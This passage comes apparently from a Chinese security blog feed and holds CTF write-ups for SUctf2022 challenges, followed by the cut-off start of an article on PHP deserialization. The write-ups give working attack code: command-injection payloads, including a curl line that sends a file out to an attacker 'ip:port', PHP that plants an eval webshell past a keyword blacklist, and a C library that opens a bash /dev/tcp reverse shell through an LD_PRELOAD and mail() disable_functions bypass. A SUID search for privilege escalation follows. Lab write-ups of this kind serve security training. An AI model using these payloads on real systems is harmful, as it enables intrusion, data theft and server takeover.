class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> flag    @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">"欢迎来到SUctf2022"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    num <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    log <span class="token operator">=</span> <span class="token string">"echo &amp;#123;0&amp;#125; &amp;#123;1&amp;#125; &amp;#123;2&amp;#125;> ./tmp/log.txt"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d-%H%M%S"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ip<span class="token punctuation">,</span>num<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span>    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> eval<span class="token punctuation">(</span>num<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>log<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"waf!!"</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      </code></pre><p>利用os.system(log)执行命令，log的话，只有num可控，没有过滤反引号，可以把命令的结果写入&#x2F;tmp&#x2F;log.txt中,然后可以通过curl命令将tmp&#x2F;log.txt的内容外带出来</p><p>payload：&#x2F;calc?num&#x3D;12%23`ls%09&#x2F;`</p><p>payload：&#x2F;calc?num&#x3D;12%23`curl%09-F%09xx&#x3D;@tmp&#x2F;log.txt%09ip:port`</p><p>这里有个＃号是因为eval执行`ls`会报错，就执行不了os.system()了</p><p><img src="https://bu.dusays.com/2022/03/30/15ab43ac2e983.png" alt="image-20220330090758365"></p><p><img src="https://bu.dusays.com/2022/03/30/0cce85df755a7.png">然后再外带出flag</p><p><img src="https://bu.dusays.com/2022/03/30/70752d90b87b6.png"></p><p><img src="https://bu.dusays.com/2022/03/30/3d42f7bd8517e.png"></p><h2 id="updstore"><a href="#updstore" class="headerlink" title="updstore"></a>updstore</h2><p>提示上传一个php文件，先上传一个phpinfo()</p><p><img src="https://bu.dusays.com/2022/03/30/f8a87ca404a14.png"></p><p>然后访问可以看到禁了非常多的函数，再上传一个读取题目源码的，但需要构造一下file_get_contents()</p><p><img src="https://bu.dusays.com/2022/03/30/bfd9ac37d8830.png"></p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>glow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return checkFile()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    嘿伙计，传个火？！    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input_file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>flare<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\$_"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"copy"</span> <span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"usort"</span><span class="token punctuation">,</span><span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"file"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwriter"</span><span class="token punctuation">,</span><span class="token string">"fput"</span><span class="token punctuation">,</span><span class="token string">"copy"</span><span class="token punctuation">,</span><span class="token string">"curl"</span><span class="token punctuation">,</span><span class="token string">"fread"</span><span class="token punctuation">,</span><span class="token string">"fget"</span><span class="token punctuation">,</span><span class="token string">"function_exists"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"putenv"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"proc_close"</span><span class="token punctuation">,</span> <span class="token string">"proc_get_status"</span><span class="token punctuation">,</span><span class="token string">"checkdnsrr"</span><span class="token punctuation">,</span><span class="token string">"getmxrr"</span><span class="token punctuation">,</span><span class="token string">"getservbyname"</span><span class="token punctuation">,</span><span class="token string">"getservbyport"</span><span class="token punctuation">,</span> <span class="token string">"syslog"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"highlight_file"</span><span class="token punctuation">,</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"chmod"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">return</span> False<span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置上传目录</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"UPLOAD_PATH"</span><span class="token punctuation">,</span> <span class="token string">"./uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"Upload Success!"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/php/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"只要好看的php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"诶，被我发现了吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$new_file_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$new_file_name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'Upload Failed!'</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;div style="color:#F00">'</span><span class="token punctuation">.</span><span class="token variable">$msg</span><span class="token punctuation">.</span><span class="token string">" Look here~ "</span><span class="token punctuation">.</span><span class="token variable">$img_path</span><span class="token punctuation">.</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>过滤了$、- 无法使用变量，无法调用类的动态方法，能写文件的函数基本都被禁了，使用内置类<code>SplFileObject::fwrite</code>写文件</p><p>构造一个写木马的php，传过去访问生成一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"EV"</span><span class="token punctuation">,</span> <span class="token string">"eva"</span><span class="token punctuation">.</span><span class="token string">"l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// EV-->eval</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"GETCONT"</span><span class="token punctuation">,</span> <span class="token string">"fil"</span><span class="token punctuation">.</span><span class="token string">"e_get_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// GETCONT-->file_get_content</span><span class="token comment" spellcheck="true">// 由于禁止了$，我们只能从已有的地方获取$符</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"D"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token constant">GETCONT</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/index.php'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">353</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// D-->$</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"SHELL"</span><span class="token punctuation">,</span><span class="token string">"&lt;?php "</span><span class="token punctuation">.</span><span class="token constant">EV</span><span class="token punctuation">.</span><span class="token string">"("</span><span class="token punctuation">.</span>D<span class="token punctuation">.</span><span class="token string">"_POST['a']);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// SHEll-->&lt;?php eval($_POST['a']);?></span><span class="token comment" spellcheck="true">//echo (GETCONT)('./shell.php');</span><span class="token keyword">class</span> <span class="token class-name">splf</span> <span class="token keyword">extends</span> <span class="token class-name">SplFileObject</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">SHELL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"PHARA"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">splf</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 对象销毁调用__destruct()写入一句话木马</span></code></pre><p><img src="https://bu.dusays.com/2022/03/30/082bcb5ec288d.png"></p><p>其实前面就可以看到php是8版本的，蚁剑过不了disable_function()，但还是记一手写马的姿势，写个马也能更好的操作</p><p>接下来就是手动绕过disable_function，</p><p>仔细观察，可以发现putenv()、mail()没有被过滤，有sendmail程序，那可以利用<code>LD_PRELOAD</code>环境变量指向恶意so文件，然后通过mail()来加载恶意so文件</p><p><img src="https://bu.dusays.com/2022/03/30/bd0ccf7f13407.png"></p><p>mail()会调用外部sendmail，然后sendmail调用getuid()，当然也可以用其他函数</p><p><img src="https://bu.dusays.com/2022/03/30/f8f662ff66b99.png"></p><p>重写getuid()反弹shell，生成so文件</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>uid_t <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>生成的so文件有$符号，不能直接传，需要利用ftp上传过去</p><p>搭建ftp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pyftpdlib<span class="token punctuation">.</span>authorizers <span class="token keyword">import</span> DummyAuthorizer<span class="token keyword">from</span> pyftpdlib<span class="token punctuation">.</span>handlers <span class="token keyword">import</span> FTPHandler<span class="token keyword">from</span> pyftpdlib<span class="token punctuation">.</span>servers <span class="token keyword">import</span> FTPServerauthorizer <span class="token operator">=</span> DummyAuthorizer<span class="token punctuation">(</span><span class="token punctuation">)</span>authorizer<span class="token punctuation">.</span>add_anonymous<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span>handler <span class="token operator">=</span> FTPHandlerhandler<span class="token punctuation">.</span>authorizer <span class="token operator">=</span> authorizerhandler<span class="token punctuation">.</span>masquerade_address <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token comment" spellcheck="true"># 注意要用被动模式</span>handler<span class="token punctuation">.</span>passive_ports <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">65000</span><span class="token punctuation">,</span><span class="token number">65100</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 用来传输文件的端口</span>server <span class="token operator">=</span> FTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span>server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>一句话木马执行，服务器监听反弹shell的端口</p><pre class=" language-php"><code class="language-php"><span class="token variable">$local_file</span> <span class="token operator">=</span> <span class="token string">'/tmp/hack1.so'</span><span class="token punctuation">;</span><span class="token variable">$server_file</span> <span class="token operator">=</span> <span class="token string">'exp.so'</span><span class="token punctuation">;</span><span class="token variable">$ftp_server</span> <span class="token operator">=</span> <span class="token string">'ip'</span><span class="token punctuation">;</span><span class="token variable">$ftp_port</span><span class="token operator">=</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token variable">$ftp</span> <span class="token operator">=</span> <span class="token function">ftp_connect</span><span class="token punctuation">(</span><span class="token variable">$ftp_server</span><span class="token punctuation">,</span><span class="token variable">$ftp_port</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$login_result</span> <span class="token operator">=</span> <span class="token function">ftp_login</span><span class="token punctuation">(</span><span class="token variable">$ftp</span><span class="token punctuation">,</span> <span class="token string">'anonymous'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 注意要开启被动模式</span><span class="token function">ftp_pasv</span><span class="token punctuation">(</span><span class="token variable">$ftp</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ftp_get</span><span class="token punctuation">(</span><span class="token variable">$ftp</span><span class="token punctuation">,</span> <span class="token variable">$local_file</span><span class="token punctuation">,</span> <span class="token variable">$server_file</span><span class="token punctuation">,</span> <span class="token constant">FTP_BINARY</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"Successfully written to $local_file\n"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>    <span class="token keyword">echo</span> <span class="token string">"There was a problem\n"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token function">ftp_close</span><span class="token punctuation">(</span><span class="token variable">$ftp</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=/tmp/hack1.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">"a@localhost"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>反弹到shell，然后在根目录找到flag，但没有权限读取</p><pre class=" language-shell"><code class="language-shell">find / -perm -u=s -type f 2>/dev/null</code></pre><p>有一个suid权限的nl，可以读取flag</p><p><img src="https://bu.dusays.com/2022/03/31/24520662c2679.png"></p><p><a href="https://segmentfault.com/a/1190000023897623">Linux命令行:cURL的常见用法</a></p><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2022/03/15/php-fan-xu-lie-hua/"/>
      <url>/2022/03/15/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="啥是反序列化"><a href="#啥是反序列化" class="headerlink" title="啥是反序列化"></a>啥是反序列化</h2><p>在这之前我们先了解下序列化，序列化是将变量或对象转换成字符串的过程。使用 serlize() 函数。<br>案例引入<br><img src="https://bu.dusays.com/2021/09/15/697e3a6616a5f.png" alt="案例"></p><span id="more"></span><p>案例输出<br><img src="https://bu.dusays.com/2021/09/15/350680d486300.png" alt="输出"><br>反序列化就是将字符串转换成对象或变量。使用 unserlize() 函数。</p><table><thead><tr><th>字母表示</th><th>含义</th><th>格式 &lt;&gt;代表这里是一个变量值，实际反序列化中没有&lt;&gt;。看上面的例子就知道了</th></tr></thead><tbody><tr><td>a</td><td>array，数组</td><td>a:&lt;元素个数&gt;:{&lt;下标或键&gt;&lt;值&gt;&lt;下标或键&gt;&lt;值&gt;…&lt;下标或键&gt;&lt;值&gt;}</td></tr><tr><td>b</td><td>boolean，布尔，值只能为true和false</td><td>b:<digit>; digit只能为0或1。</td></tr><tr><td>d</td><td>double，双精度浮点型，用来存储小数</td><td>d:&lt;整数或小小数&gt;;</td></tr><tr><td>i</td><td>integer，整型，用来存储整数</td><td>i:&lt;整数&gt;;范围为：-2147483648 到2147483647。</td></tr><tr><td>o</td><td>common object，php3引入用来标识对象，php4以后被O取代。</td><td>这个基本处于半废的状态</td></tr><tr><td>r</td><td>reference，引用</td><td>r:&lt;所引用对象的编号&gt;;O:6:”ClassA”:5:{s:3:”age”;i:1;s:3:”name”;s:5:”Tom”;s:4:”sex”;b:1;s:3:”obj”;r:1;s:2:”pr”;R:3;}最前面的class编号是1，然后age编号是2，name编号是3，sex编号是4，obj编号是5，pr编号是6</td></tr><tr><td>C</td><td>custom object，自定义对象，很少用到，后面也会有详解。PHP5时引入的</td><td>C:<name length>:”<class name>“:<data length>:{<data>}</td></tr><tr><td>s</td><td>string，字符串</td><td>s:&lt;值的长度&gt;:”&lt;值&gt;”;</td></tr><tr><td>N</td><td>null，空值</td><td>N; 就一个单纯的N就行了</td></tr><tr><td>R</td><td>pointer 